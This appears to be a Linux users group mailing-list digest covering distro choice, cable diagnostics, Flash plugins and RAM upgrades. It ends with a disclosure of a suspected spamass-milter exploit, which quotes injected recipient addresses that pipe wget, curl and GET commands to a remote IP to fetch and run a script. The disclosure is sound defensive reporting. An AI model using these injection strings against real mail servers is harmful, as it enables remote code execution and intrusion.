Also my favorite distros to get new people (or anybody else) to use Linux,
is Mint and Mandriva.

You can do side by side installs on Slackware Rich. I'll need to find
the link I was reading on how to do it. As far as KDE goes .. never
been a huge fan. I've been using XFCE for as long as I can remember
and abandoned Gnome long before Pat killed it from inclusion in the
project.

When I scanned with my OfficeJet V40, I put the paper in and hit the "scan"
button.  My machine saw the scanner then, and I was able to pull up SANE
and get scans.

Note that SANE wants to save scans in a format that eats up a lot of disk
space.  If you can, tell it to save as TIFF or something.

Good luck!

   With the Xsane front end you can elect to save (.png, .jpg, .tif at least)
or, for documents, as .pdf. The latter allows you to save multiple page
documents in a single file. I have used the latter extensively, especially
when I'm sent a paper RFP and need to provide copies to my collaborating
partners. Did a 97 page pdf one day. Borring!

   This goes under the category of 'if it ain't one thing, it's another.'

   A half hour ago I killed X (via the Xfce interface) and logged off the

see it halt after a few lines of the scipt. And there it sits. There're no

   Where should I start looking for a cause?

   I'll pursue this tomorrow morning because I'd rather have dinner now and

Um, er, when we discussed this back in December it was pointed out
that the total cabling limit for 100BASE-CX and 1000BASE-CX (STP) is
82 feet. Since you're also running an additional 100' of UTP in that
segment you're pushing your luck even without cable degradation and
the coupler in the run.

Temporarily replace the STP cable with an above-ground substitute and
see if that clears things up.

Message-ID: <ae2db4621003092258s505e6f4er575a8da79c95bf32@mail.gmail.com>

my 3/4-baked theory is that many people new to linux use what their
friends suggest, or what they first or most compellingly hear about.
that is, they don't do comparative research between available/relevant
distributions and choose logically.

certainly that was the case for me in the early days and even now i'm
more a "try it and see" type than a heavy researcher when i experiment with
distros i haven't used before.  hmm, then again, i know more of what i
want and need from a distro now, and can judge some things instantly
that i would have not understood when i was getting started, so maybe
the past 16 years has been of some use after all =)

anyway, what is your take on how people choose distributions, and/or
how did you choose your first?  i think newbies are an especially
interesting discussion because we are attracting so many to our ranks
these days and i'm curious as to what trends will shape the future of
the landscape;  i believe that the distros that see the most users
fare the best in terms of vitality and usually pace/success of
development, commercial or non (though that is a belief open to
debate in itself).

personally, i started with slackware because i was unaware anything
else existed and my mentor used slackware, though i understood that
slackware was not linux.  the second time (in as many weeks) that i
installed it i downloaded it myself from somewhere that had other
distros mirrored too and i noticed their presence but was not
inquisitive for many months (and many reinstalls).  it maybe that
nothing else was as mature and generally awesome and in english at the
time (mid-1994), but i certainly can't vouch for that with any
certainty.

thoughts?

If I understand the spec correctly for 100BaseTX, I should be fine.
The 90' cable is labeled as outdoor Cat 5e, though I wonder how 
long is this cable going to last?

I don't know what CX is and I'm not running a gigabit link, so the run
doesn't have to work at those speeds anyways.

Interestingly, turning off duplex and dropping the link speed to 10 mbps
stabilizes the link.  I noticed that duplex was set to full on the link
and that the link was unstable with that setting.

I suppose I can try a single run of UTP cable for the full 190'.  That
would eliminate the buried segment and the coupler as possible issues.
The first 100' of Cat 5e UTP cable could be the problem.

Trouble is, I have to bury the cable as that is the only practical way
to go.  Should I jump up to Cat 6 STP cable?  Is there a special cable
meant for direct burial that I should use?  How about burying the line
in conduit?  I've heard that UTP cable can be used if in conduit burial
is employed and moisture is kept out.

Let me assume that the limit isn't 300 meters, let's say the limit is
more like 82 feet.  Well, why didn't putting a 10/100 switch where 
the coupler is fix the can't transmit faster than 10 mbps problem?
Why was I able to buy a 100' Cat 5e UTP patch cable?

That's how it I chose my first, a friend my "guru" started me off in '01 and
with all the distros available, with gentoo.....

it took me 3 weeks to compile a working kernel (I wasn't an astute forum
reader then)

but after trial an error and learning that reading forums were a good thing,
I learned about trust...

I would port forward ssh and give my then mentor root access, not
surprisingly about 100 instances of firefox opened up displaying
goatse.cx....

lesson learned, I then traversed to Yellow Dog for my G3 and the rest is
history

I actually lean towards Ubuntu these days as I'm less inclined to lean my
system, although I have been  moving so much the last 4 years I just do what
is convenient and will get me up asap.

Once I get settled again I'm sure I will get back to the puristic  love....

I think someone brought one to the last advanced topics meeting.  I
first saw at LinuxCon when they weren't even available to developers
outside of Nokia itself.  It seemed pretty sweet.  It isn't really
meant to be a mass market phone, but a phone for people writing
software for the next release which will be a mass market phone.  So
if you are interested in writing software for the upcoming Nokia linux
smartphone market you can start now, otherwise it's at least usable as
a phone or tiny linux computer but isn't considered polished yet.

100 Meters [300 ft] unshielded twisted-pair cable is the "standard" for 
*all* "baseband" runs.  YMMV slightly depending on on cable choice [5, 
5e, 6].

f 10 Mbps half-dup works, but you can't get a stable connection that 
supports auto-negotiation to a higher speed and full-dup then there are 
2 things to look at.

1. The cable run.

2. The NICs

You can check for problems at both of these points by looking at 
ethernet error stats w. ethtool

ethtool -S eth0
NIC statistics:
     rx_errors: 0             
     tx_errors: 0             
     tx_dropped: 0            
     collisions: 0            
     rx_length_errors: 0      
     rx_over_errors: 0        
     rx_crc_errors: 0         
     rx_frame_errors: 0       
     rx_missed_errors: 0      
     tx_aborted_errors: 0     
     tx_carrier_errors: 0     
     tx_fifo_errors: 0        
     tx_heartbeat_errors: 0   
     tx_window_errors: 0      
     tx_abort_late_coll: 0    
     tx_deferred_ok: 0
     tx_single_coll_ok: 0
     tx_multi_coll_ok: 0
     tx_timeout_count: 0
     tx_restart_queue: 0
     rx_long_length_errors: 0
     rx_short_length_errors: 0
     rx_align_errors: 0
     tx_tcp_seg_good: 0
     tx_tcp_seg_failed: 0
     rx_csum_offload_errors: 0
     alloc_rx_buff_failed: 0
     rx_dma_failed: 0
     tx_dma_failed: 0

You should be able to just ifdown then ifup the interface to clear the 
counters and then watch the counters while both NICs are set to 
auto-negotiation.

*The problem w. auto-neg is that not all vendors implement the standard 
correctly, so many times an Intel card and D-link card may not play well 
together.

If you see a lot of collisions that could mean you have a bad NIC that's 
jabbering away and causing the other NIC t back-off and retransmit.

If you see carrier errors that would be more indicative of a problem w. 
the cable. I don't know if this is a home-made or store bought cable. 
But the other thing you could try if you have the tools and skills and 
cut the ends of and re-crimp new connectors on them. *Especially if you 
see the protective sheath is not inside the connector, which means the 
hair-width copper wires can be easily bent and/or broken.

You're seriously trying to understand the psyche of the Linux
newbie?

I would say your theory is pretty good for a large % of that population.

I would think most Linux newbies would choose distros that use words in 
their description
such as "user-friendly", "windows-like", etc...

It would be interesting to get some stats on the 1st distro people chose 
and why.
I chose Red Hat back in 2001 as it was the only Linux distro I had
heard of then.

I would tend to think Ubuntu is the door that most Linux newbies choose 
to get into Linux-land...

Interesting enough, a Google search on just the word "Linux" returns
the following results from top to bottom:

Ubuntu.com
Debian.org
redhat.com
fedoraproject.org
distrowatch.com
gentoo.org
slackware.com

I've got a 64-bit Fedora 12 VM (on a CentOS 5 host). I like the 
deltarpm stuff. I'm interested to see if that makes the jump to RHEL 
and CentOS.

You should test both segments individually, and swap out the coupler in the
middle.  What that run is doing is NOT NORMAL.

After much wrestling with drivers for NVidia Quadro (laptop) video, yes. 
I'm running the PAE kernel.

I have some interesting issues with hibernation, and undock/re-dock, which 
I did not have with Fedora 11. But overall it seems pretty alright.

Message-ID: <f77f05331003101003i6c38dfcfy7dfeff8ec094fac8@mail.gmail.com>

I am a newbie. I started using linux this past summer. I am an IT audit
manager at a company located at the Montgomery Park building. Our company
runs RHEL on servers that run our ERP and a few other servers. Having
struggled to audit our Linux servers, I decided to take a class from Red Hat
(their entry-level Linux Essentials class). I really enjoyed the class and
was surprised by all that Linux offered in the way of features (e.g.
kernel-level firewall, KVM, etc.) and security (e.g. SE Linux). That class
fueled an even greater interest in Linux. One of our Linux admins gave me an
Ubuntu cd, but I didn't want to learn a distro that was different that what
our company uses. I discovered CentOS. I obtained an old desktop computer
from our IT department to use as a sandbox and loaded CentOS on it. I
purchased Negus's "CentOS Bible" and Membrey's "The Definitive Guide to
CentOS". Later, I purchased Sobell's"A Practical Guide to Linux Commands,
Editors, and Shell Programming". After some study, I decided to convert my
home laptops to Linux. For my home PCs, I tried CentOS, but later changed to
Fedora (in an effort to not overwhelm myself by staying with one
distribution family). I have successfully converted my home PCs and my
family didn't realize they were not using Windows until I told them. By the
way, getting my somewhat older home laptops to run Fedora successfully has
been no easy task. I've spent countless hours troubleshooting wireless,
video, sound, etc - posting on CentOS and Fedora forums, filing bug reports,
and googling like crazy. I've found this frustrating at times, but I've
taken satisfaction in all that I've learned. Early on, I made the goal to
obtain a RHCE certification. This is still a goal, but as I learn more I
realize I still have long way to go. I've created over a hundred flash cards
to help me memorize commands, the file system, key configuration files, etc.
In short, I chose CentOS/Fedora because that is what my company uses and I
want job relevance. From this pursuit, I realize that Linux as a desktop is
more buggy, supports less hardware, and is less user friendly than Windows
(although I like it better - go figure on that one). I understand that Linux
has come a long way in this area and I think they'll get there in a few
years. Sorry for the Ramble, Mike

-------------------------------------------------------------------------------------------------
my 3/4-baked theory is that many people new to linux use what their
friends suggest, or what they first or most compellingly hear about.
that is, they don't do comparative research between available/relevant
distributions and choose logically.

certainly that was the case for me in the early days and even now i'm
more a "try it and see" type than a heavy researcher when i experiment with
distros i haven't used before.  hmm, then again, i know more of what i
want and need from a distro now, and can judge some things instantly
that i would have not understood when i was getting started, so maybe
the past 16 years has been of some use after all =)

anyway, what is your take on how people choose distributions, and/or
how did you choose your first?  i think newbies are an especially
interesting discussion because we are attracting so many to our ranks
these days and i'm curious as to what trends will shape the future of
the landscape;  i believe that the distros that see the most users
fare the best in terms of vitality and usually pace/success of
development, commercial or non (though that is a belief open to
debate in itself).

personally, i started with slackware because i was unaware anything
else existed and my mentor used slackware, though i understood that
slackware was not linux.  the second time (in as many weeks) that i
installed it i downloaded it myself from somewhere that had other
distros mirrored too and i noticed their presence but was not
inquisitive for many months (and many reinstalls).  it maybe that
nothing else was as mature and generally awesome and in english at the
time (mid-1994), but i certainly can't vouch for that with any
certainty.

thoughts?

I'll raise that to 4/5ths. I am soon going to convert one of friends
M$ boxs to Linux.
I am considering both Fedora and or Ubuntu. Fedora because I have been using
RH since their 5.1. I dont want to get into any religious wars please.
Ubuntu since
my friend is new to Linux and it is the current 'hot new thing'.

Where I work we use RHEL for various reasons, so I use CentOS for testing and
Q/A.

Anyway .. welcome to the family .. at least you have a choice !

While this may have been a suggested way to do upgrades in days
long past, upgrading in this way on ubuntu is *not* recommended and
there's a distinct possibility that you can be left with a borked
system afterwards.

The recommended ways to upgrade ubuntu are through update-manager (the
default gui update tool) and do-release-upgrade (cli).  Because 8.04
is an LTS, it won't ask if you want to upgrade to non-LTS releases by
default; you'll either need to use the Software Properties to change
the setting, or run "update-manager -d" or "do-release-upgrade -d". See
the pages linked off of https://help.ubuntu.com/community/UpgradeNotes
for more details.

> and install xubuntu??

Yes, install ubuntu normally, and then apt-get install xubuntu-desktop.
Furthermore, you could do them in either order:

  - install 8.04, upgrade to your desired release (9.10?), install
    xubuntu-desktop

  - install 8.04, install xubuntu-desktop, upgrade to your desired
    release (9.10?)

However, two things to keep in mind:

  1) if your 8.04 image is 32bit, you'll probably want to download
     a new iso anyway, as switching an installation from 32bit to
     64bit is non-trivial (and multi-arch support is not here yet).

  2) upgrades will end up downloading a lot packages, particularly if
     you're upgrading through several releases (e.g. 8.04 -> 8.10 ->
     9.04 -> 9.10), plus there's time involved to upgrade all those
     packages. It's probably faster to just download the xubuntu
     release iso you want and install from that.

One other issue you may have with trying install and upgrade off of
8.04 media is that, depending on your new system's hardware, some
critical piece may not be recognized, like your network card.

> And what would the sources.list look like??

The sources.list will be the same, whether you use the xubuntu (XFCE)
desktop, the ubuntu (GNOME) desktop, or kubuntu desktop; they're all
part of the ubuntu project and all use the same package archive.

I'm running on older hardware. The graphics controller is nVidia GeForce2
MX/MX 400, which doesn't work with the latest nouveau driver (it's spoze
to), so I have to downgrade to a previous version.  The failure symptoms I
see were reported for newer nVidia controllers as a bug, acknowledged, and
repaired.  My controller wasn't affected until after the 'repair'.

Otherwise no complaints.

Um, according to the spec, the UTP/STP limit is 100 meters for 100bt and 
1000bt. 100 meters is just over 328 feet

Is it really STP? and is the shielding properly grounded?

Sounds about right.  In my case, no one I knew used Linux.  At the
time I took the plunge, the biggest debate (from what I could gather
from USENET, anyway) wasn't so much, "Which distro?" but "Which
package management?," with a growing vocal minority cheering for
source-based packages.  (Gentoo was making a big splash back then.)

I wouldn't say my choice was necessarily logical, but I did some
comparative research on the merits and drawbacks of RPM vs .deb vs
source, and decided I liked the sound of .deb-based package managment
best, given my needs and inexperience.  So I tried Mepis and Libranet
first, because Ubuntu didn't exist and pure Debian at the time scared
the hell out of me, especially the process of getting it installed
(which was far more complicated than it is today).  Mepis had an
excellent live CD that worked, and Libranet was easy to install.

Now, though, I don't think "RPM hell" is such an issue and many of the
major distros and their offshoots have done so much to abstract the
package management process that it isn't such a major consideration.

I started using linux after I got sick of blue screens of deaths and
started with Ubuntu because that's what my 'guru' thought would be the
easiest and most welcoming community for me.  He was a Gentoo user
back then, so I had no choice but to look in the forums.  His advice
was great and while he was always there to help, I learned right away
that his initial question would always be "What did they say in the
forum".  While he did help me translate the conversation into human at
first, it didn't take long before I wasn't asking questions to him at
all.  And now I've been a happy linux user for just over five years.

Hi Daniel, et. al.,

I guess what I'm interested in is a mass market phone that I can
eventually hack if I ever get sophisticated enough to do such things.
Right now, I don't have a smart phone, but I think I'll wait for the
next version of the n900 so it will be more polished, so to speak, and
still have the hackability of the current n900.

I also hope that it will have the same "finger actions" as the iphone.
 I love the multi touch, and I don't like having to use a fingernail
on the n900 to move around.  It's touch resistance, or whatever, as

Having said all that....I'd still like to see a n900.

Interestingly, i moved to Windows from the Mac (circa System 8 - 
mid/late '90's) because i had to use Windows at work and because i got 
sick of $helling out big buck$ for Apple hardware and OS upgrades (and i 
got sick of my growing closet-ful of orphaned Apple hardware). i'd 
always enjoyed Unix at school and work (one of my all-time favorite work 
environments was managing a college computing lab that consisted of 
Alpha, SPARC, and NeXT workstations, plus early Macs). About four years 
ago i got fed up with Windows and started looking at dektop Linux 
distros - first Red Hat (employer bought me a license so i could counsel 
our clients on conversion-from-Windows issues), then Fedora ('cuz RH was 
so stodgy feeling), then OpenSuse, which felt pretty good for a while. 
At first blush, Ubuntu (Feisty) felt a little dumbed-down in comparison, 
but i kept an install around and eventually switched when the 
twice-yearly upgrade process became smoother (and i got a machine with 
non-ATI video hardware). Fortunately, my last two employers have let me 
have my choice of OS at work, and i currently coexist with Windows and 
MacOS users quite happily.

For my uses (programming, digital audio), every OS i've tried has ranged 
from mildly annoying to throw-it-out-the-window frustrating, depending 
on what i'm trying to do. So far, Ubuntu gives me the best usability and 
utility bang for my buck, for about the smae time committment to keep 
things humming along as MacOS or MS Win.

I support Linux, Mac, Windows, and Solaris -- they all exist as both 
servers and desktop workstations. They mostly work and play well 
together. I'm not happy with the state of shared-calendaring software, 
but otherwise clients can be found on all those platforms for 
standards-compliant services. RDP/X11/VNC can be used to export 
desktops across the network when a user on one platform needs a 
proprietary application on a different platform -- or local VMs can be 
used if licensing isn't an issue.

I'm a "poke around a bit then jump in" sort.  After some early 
experience with Knoppix (thanks, Kieth) I tried (ca 2002) Debian because 
Knoppix was Debian based and I figured "go to the source!!".  I soon 
realized that the only way it would work reliably was if I became far 
more of an expert than I'm interested in being.

If Knoppix had come with an "install now" feature I would have hit the 
button and been happy.
But it didn't, and in trying to find out how to install it permanently I 
found out that it's totally centered on being a live-on-CD 
distribution.  So I poked around a bit, found out that Ubuntu is Debian 
with training wheels, and I have yet to learn how to ride without them :-).

Maybe things changed in the last 6 years since I last did this, but back
then (knoppix 3.2) you could install it to the hard drive. There was a
script called knx2hd that was part of the distribution. I ran knoppix
installed in this way for quite a while, before turning to "echt" debian
(play on words).

A former Linux newbie; how I chose:

Word of mouth, Internet research, led me to Ubuntu as the best
combination of Windows-user friendliness, stability, hardware
compatibility  and applications offerings. I wanted to have as seamless
a transition from Windows as possible, with as little Linux skill
required as possible  (even though I had moderate experience with BSD
Unix from the 1980s.) Ubuntu's Gutsy Gibbon met those  requirements
fairly well, although I suspect every major distro makes the same
claims.  

Since then I've done a fair amount of distro hopping, especially since
Unetbootin made it so easy to set up a Live CD installation on a USB
drive from virtually any distro, obviating the need to burn a new CD/DVD
for every new release. I still keep coming back to Ubuntu for many of
the same reasons. Ubuntu seems to have fixed the few problems that
existed in back the Gutsy days (sound and NVidia driver issues mostly).
The only other Linux flavors that have attracted me were Mint and Mepis,
both Ubuntu variants. I've just had too many issues arise with Mandriva,
Fedora and other RPM-based distros (probably arising as much from my own
lack of Linux skill as anything). 

There is a reason why Ubuntu is the most popular distro out there and
Mint is #3. It just seems you don't need to be Linux guru to get
started. For those Windows refugees among us who needed a desktop OS we
can actually use productively as well as learn from, Ubuntu fits that
bill. One can develop a reasonable amount of Linux skill while still
using the system in much the same way we used Windows. 

In summary, ease of transition from windows, encompassing stability,
hardware compatibility  and applications offerings were the deciding
factors.

As a huge Nokia supporter surrounded by iPhone fan-boys I've heavily
researched and fiercely debated this whole resistive vs. capacitive 
touchscreen
and "mult-touch" myth.

Resistive verses capacitive refer to the way the screen surface is built 
and the way
that it registers a touch. It has nothing to do w. "multi-touch" capability.

"Multi-touch" touchscreen technology existed before Apple. Apple lists the
phrase "Mult-touch" on their page of trademarks, however to the best of
my knowledge no government recognizes their claims.

Many of the higher-end Nokia smartphones(N and E series) aren't 
considered "mass market" simply because
most of them ship unlocked to the U.S. in limited quantities and are 
typically
over $500. Which is in stark contrast to Blackerry, iPhone, Palm, and 
Android
which are carrier subsidized.

Most of the Nokia N-series and E-series phones run Symbian,
except for the N900 which runs Maemo. Although, this is v1 of the N900, 
I don't
think it's geared toward devs. It's fully functionally as compared to 
say the G1 when it came
out. As a matter of fact, Nokia slipped the release date to clean up 
some rough edges.

As for hacking smartphones I'm not sure what you have in mind but you 
could get a used G1
at this point for a fraction of the cost of a N900 and I hear the 
Android SDK is really slick.

Or if you're more interested in hacking Maemo specifically, you can 
probably find a  N700,  N800, or
N810 internet tables that all run Maemo. I have the N700 and N810. Or 
you can just download the
Maemo SDK from maemo.org and start learning.

Message-ID: <1268299095.4677.9.camel@eagle.robinson-west.com>

Has anyone gotten this to work properly in Slackware 10.1?

I believe that Monorail 3D audio is OPTi931 based.  I have trouble
with oops messages on boot when the onboard sound card is enabled.
I've tried tweaking isapnp.conf to see if using IRQ 7 for the MPU-401
feature instead of 9 or 10 will work.  Still, I didn't have an
isapnp.conf last time I booted and Slackware tried to configure the
card just the same, unsuccessfully I might add.  Googling around, 
I've run into something about needing to statically, non PnP, 
configure this card.  I don't know how to do this unless there 
is a driver for freedos which is what I boot Slackware from.

Has anyone gotten Monorail built-in 3D Audio to work in Linux?

Monorail would probably still be around if the company had been smart
enough to integrate hardware that works with Linux and smart enough to
offer an LCD monitor upgrade for those who want to play Doom.  Oh well.

I don't know anything about Monorails, but in some BIOS screens I've seen
options to specify hardware settings like IRQs for onboard devices. There is
a very remote chance that there are jumpers on the motherboard for changing
these.

I assume you've checked for this already, but I figured I would mention it
just in case..

I promised an update on this saga.

I tried downloading first a "Windows 7 Ultimate" OEM image, then the
same for "Windows 7 Starter."  Though I'd read that the former would
allow me to install any version of Win7, it only offered to install
Ultimate, and that failed when I input the key that came with my
netbook.  The starter image, however, installed successfully.  That
left me with a dual-boot system, but without the restore partition
that came on the device.  And without some drivers, though those seem
to be available from Samsung's site.

At some point I had a chat conversation with a Samsung tech about
restoring the missing partition.  After some time -- it was apparently
a new question for him -- I was told that my only option was to send
the netbook to their repair facility to have the disk restored to
factory defaults.  I got partway through filling out an online request
form for this service -- wasn't able to complete it because it didn't
like my browser -- and it appeared that my only cost would be shipping
one-way to them.  We'll probably go this route if only for the
experience.

The Samsung tech didn't feel that not having the restore partition would
mean my warranty was void.  The earlier rep may have been misinformed.

Downloading those OEM images was my only experience with bittorrents
since I stopped grabbing Knoppix images years ago.  I seemed to be in
a very small minority having a license for what I was, to all external
impressions, "pirating". :-)

Thanks for all the tips on this!

You have to edit the .iso to get all versions displayed on the screen 
where Ultimate is shown. You have to delete the ei.cfg file in the 
sources folder on the DVD, or rename it. Then you can use the Starter key.

I prefer not to have those partitions. They wipe the system clean when 
used and most regular folk don't keep backups. I've heard countless 
stories of people that had no idea all their stuff would be gone when 
finished regarldess of all the warning screens shown before pulling the 
trigger. An actual OS install disc is always the best solution, then 
download the current drivers from the manufacturer or better yet the OEM.

Just make sure you use the official checksums to validate the ISO you 
downloaded.

Close any open Firefox sessions.  Then Open a terminal and type this:

$ firefox -ProfileManager

Create a new profile (e.g. foo), select the new profile, uncheck
"Don't ask at startup", then click on "Start Firefox".

Once you have your browser window open, click Edit > Preferences.
Does it display properly?  If not, switch to the terminal window using
Alt+Tab to see if there are any error messages and what they say.  If
it does display correctly, exit Firefox, start Firefox, delete the old
profile and use the new one (rename it first, if desired).

Good luck and let us know how things go.

Have you any archives/backups of your prior HOME directory under any
previous Linux versions/distros? 

If you do, copy  that /home/<username>/.mozilla directory  to your newly
installed /home/<username> directory. That should  implant your prior
Firefox  settings, as well as  a working  flash plugin  (presuming you
had one previously) and any mail you received  from a Mozilla client
(Seamonkey, etc).   If the problem persists at least you have narrowed
the possible problem, excluding your home  directory.

Thanks for the reply..

I can't seem to get flash to work..

Every time I go to a flash site..  Firefox asks if it is ok to install
the adobe plugin.. I say yes.

It installs it. And it still doesn't work??

Do I need to close Firefox down??

TIA

Flash works fine for me with Firefox on Fedora 11, x86_64. I think I
installed it with yum or yumex directly.

In my experience you almost always have to restart Firefox when you
install any plugins or extensions or add-ons.

If you're still having trouble, I'll search on "flash" in yumex and
then post the results here. My theory is that if it works for me and
you have the same packages installed, it ought to work for you too. I
realize that is not very scientific, but I've used the technique many
times for other problems that people are having, and it usually works.

Hello,

On Fedora, you will want to install the RPMFusion software repo, and then
install the flash-plugin package.
Good HOWTOs here:
http://howtoforge.net/the-perfect-desktop-fedora-12-i686-gnome

I believe installing the RPMFusion repo is on page 3, and installing several
packages is on the next page, including flash.

Also check
www.fedoraforum.org

Installing the manual package from Adobe should work, but on Fedora using
the flash-plugin package is the preferred method.

Many of our local XX chromosomed geeks are busy with Open Source
Bridge and with OSCON, so you may find fewer available for NCWIT.
Ask at Linuxfest, perhaps.

Hey Scott - So what was your experience of this event? I was hoping you
would share with the rest of class. But maybe it was such a good thing 
that you
decided to keep it all to yourself!

Marvin,

John is correct. You have to install the adobe repository and add flash via
yum or yumex. Here are the instructions:

Flash works fine for me with Firefox on Fedora 11, x86_64. I think I
installed it with yum or yumex directly.

In my experience you almost always have to restart Firefox when you
install any plugins or extensions or add-ons.

              March PLUG Advanced Topics


    What Went Wrong with My Disaster Recovery Plan


7PM Roots Organic Brewery 1520 Southeast 7th Ave near Hawthorne

Brian Martin will be test-driving his IEEE presentation on his
experiences in a true, "abandon the building" disaster recovery effort.
 He'll place particular emphasis on where technically sound, well-tested
disaster plans often fail in a real disaster, and how these problems can
be overcome.

The best data center disaster recovery plans are developed carefully and
tested regularly. If you're at that stage, you may think you are well
prepared. In this entertaining presentation, Brian Martin describes the
unexpected problems that arose when a well thought out and tested plan
met a real disaster, and draws lessons that are applicable to any
disaster recovery situation.

Brian Martin has spent 30 years in the IT field, fairly evenly divided
between being a mainframe system programmer and a server system
administrator.  He has operated Martin Consulting Services in the
Portland Oregon area since moving to Portland from the San Francisco Bay
Area in 1996.  He has a wife, two cats, a dog, and nine in-service
computers at home.

What am I doing wrong...??

Should be easy.. It was in the database for Debian

Not so for Fedora unless it is kept in some obscure place??

Any pointers would help..

It uses "open source development tools".  You can write closed
source apps with GCC, and open source apps with visual C++ . 
I'm glad they like our tools, but it is their own code that 
counts.   If it IS open source, and has a USB port, I can imagine
Russell building a wifi stumbler with it.

Notice how the time does not update on their "demo"?  A true demo
would be difficult - I don't expect that - but they could have
been less careless faking it.

Meanwhile, there are few specifications, which is not surprising,
because this is unlikely to work very well. 

The human eye is a very good camera, compared to most things
electronic and inexpensive.  The eye also has no latency, and
a video system will have field rate latency, at least.  Very
small delays are disorienting.  Not what you want for real-time
control, in a wide range of illumination conditions.

The LCD display will be a power hog.  It looks like a iPhone 
turned sideways, and probably has the same battery life as an
iPhone playing continuous videos.  So it may need frequent
recharging.  "Up to 9 hours" is weasel words that includes 
much smaller hours, especially as the battery gets old.

Still, it would be fun to play with one.  I will let somebody
else spend the $350 and try theirs - until theirs is stolen. 
I spent much less than that for my bike, decades ago.

Thanks for sharing it, though.  It reminds me that I need to shop
for a new helmet mirror.

Sure thing. I ended up writing a blog post recap of the event and the 
project I worked on:

http://blog.zenlinux.com/?p=328

You can also see quick video introductions of the projects here:

http://portland.startupweekend.org/2010/03/06/day-2-candid-interviews/

As expected, pretty much everyone was working on web applications of 
some sort. There was also a renewable energy project idea, but I believe 
even that was based around a way of monitoring home energy use via a web 
site.

Even though I was one of two teams who ended up working on a project 
solo, I spent a lot of time meeting and hanging out with some really 
smart and motivated "startuppy" people, and had a really good time.

It was a good way to spend a weekend, for certain. :)

I believe there will be another Startup Weekend Portland in September.

Scott

Just to be safe... I talked to Roots and they don't try to compete with
the Irish pubs. I believe you will have to bring your own green food

Randal, our resident streamo extremo will be out of town. Does anyone
have the needed gear and account?

If *wildly* successful and off appeal to the normal meeting, we might be
able to talk Brian into giving the presentation again. I know David is
looking for a speaker.

There is a source RPM here:

It compiled just fine for me.

You're doing it right.  Their server is acting screwy.  Sometimes I
get dog and other times I get the same results you get.  Even when I
get results for dog, many of the links on the results page go nowhere.
 For example:

http://www.rpmfind.net//linux/RPM/mandriva/2010.0/SRPMS/contrib/release/dog-1.7-8mdv2010.0.src.html

Here are two links that do work and go to the src rpm for Mandriva and OpenSUSE:

http://www.rpmfind.net//linux/RPM/mandriva/devel/cooker/SRPMS/contrib/release/dog-1.7-8mdv2010.0.src.html

http://www.rpmfind.net//linux/RPM/opensuse/11.0/i586/dog-1.7-239.1.i586.html

Good luck and let us know how things go.

Subject: [PLUG] Trouble with siliconhd homerun network tuner...
Message-ID: <1268720796.4527.10.camel@eagle.robinson-west.com>

I can get it to work with a 2.4 Ghz P4 and 512 megs of ram on a CentOS
system no problem.  On my Windows XP 3.06 Ghz P4, 1.5 gigs of ram, I
can only get television streaming to work in an administrator account.
I used tweakxp.exe and then uninstalled it because it is only free for
30 days.  The important tweak I used this for forces Windows XP core
to run out of memory instead of swapping in and out from hard disk.
Another tweak, I set the minimum and maximum pagefile size to 1.5 gig.
Beyond that, I don't think I did any other tweaks that made any
difference.  How can I figure out quickly what the differences are
that cause performance problems in non administrative accounts?

I'm close to thinking that I'm going to have to dual boot on my Windows
machine CentOS to get things working.

When I try to stream television from the tuner in the guest account on
the XP box, at most there is 1 frame and than the picture freezes and
there is no sound.  The tweakxp.exe utility was supposed to propagate
changes to all accounts, but I guess that didn't happen.

Subject: [PLUG] Is 1 GB enough memory?
Message-ID: <4B9F7B89.4060307@comcast.net>

My sister recently upgraded from an XP machine to a Mac. I got the 
hand-me-down. I now have a test machine and plan to use it to try out 
different distros. XP will not be one of them.

One reason she got her new machine is that the old one runs so slowly. 
Of course, XP is part of the problem, and who knows what mischievous 
malware has found its way onto the hard drive (no, I'm not connecting it 
to the house network until I wipe that drive and load Linux).

Another reason it is slow is that it has only 256 MB of RAM. The mother 
board has two memory slots with one DDR PC3200 stick in it. I can get a 
1 GB stick for $36. Will that be good enough? I realize that more is 
usually better, but $36 is better than $72 for now.

Other details:

Processor: AMD Sempron 2400+, 1.6 GHz
Hard drive: 111 GB (can't see the make and model unless I take it out.
Floppy, CD writer/DVD reader.

TIA for any advice.

Remember about a couple of weeks ago when 1.6G was FAST??!  Anyway, more 
= better but a Gig should work fine.  I have several 1G systems with 
various distros and they work well with no swapping, etc.

I just installed Fedora 12 and the requirement was at least CPU 400

YMMV

First - check the specs on the motherboard and see just how much memory, 
and in what configurations, the board will take.
Hope this helps

1G should be ample to load all required runtime processes into memory
without swapping. More memory will give you a bigger disk cache, but you'll
be "over the hump" with 1G.

I would think this is prefectly fine in terms of size.

However, you should consider whether or not the motherboard is
dual-channel or not.  Not sure if you're familiar with this timing
hack that motherboards have been using, but often you can get better
speed out of 2 or 3 smaller memory sticks rather than a single one of
a larger size (with all timing specs being otherwise the same).

See:
  http://en.wikipedia.org/wiki/Dual-channel_architecture
  http://en.wikipedia.org/wiki/Triple-channel_architecture


Of course you can always start with a single 1GB stick and then add
another later, but you want to make sure it's the same kind or at
least has the same timing.  Also, as that memory type ages and falls
out of fashion, prices will go up.

Good luck,
tim

A live CD should allow you to find the make and model of the hard
drive. 

I concur with others that 1 GB of RAM should be ample for normal
purposes. I have 4 GB in my laptop and frequently find that I am using
over 3 GB of it, but that's when I'm editing a document in Scribus. It
all depends on what you use the computer for.

It really depends on what you're planning to do with the system.
Video editing?  Not enough.

General use? Sure. Especially if you use XFCE and Chrome for your browser. 
Firefox will chew up that RAM.

Subject: [PLUG] spamassassin or spamass-milter exploit
Message-ID: <alpine.OSX.2.00.1003161215330.1237@guild.galois.com>

This is a heads-up that there might be an actively exploited 
vulnerability in either the spamassassin or spamass-milter package. 
I'm still unsure where the problem lies, but here's what I know.

The system described below runs x86_64 release of CentOS 5.4. SELinux 
was, at the time, in Permissive mode. The packages involved, as far as 
I can tell, are

   * spamassassin-3.2.5-1.el5.rf (rpmforge)
   * spamass-milter-0.3.1-1.el5.rf (rpmforge)
   * sendmail-8.13.8-2.el5 (centos)

Mar 15 05:47 (times are PDT): Several messages arrived with suspicious 
recipients:

   <root+:>
   <root+:"|wget http://61.100.185.177/busy-1.php">
   <root+:"|GET http://61.100.185.177/busy-2.php">
   <root+:"|curl http://61.100.185.177/busy-3.php">

Sendmail recognized the addresses as syntactically evil, but a process 
running under the spamass_milter_t context ran wget, GET, and curl and 
connected to the IP address in the addresses above.

The file(s) downloaded by these processes executed a shell script. It 
did several things, the highlights of which are

   1. It downloaded, uncompressed, and untar-ed a file named
      xS.tar.gz. The resulting directory name was /xS.

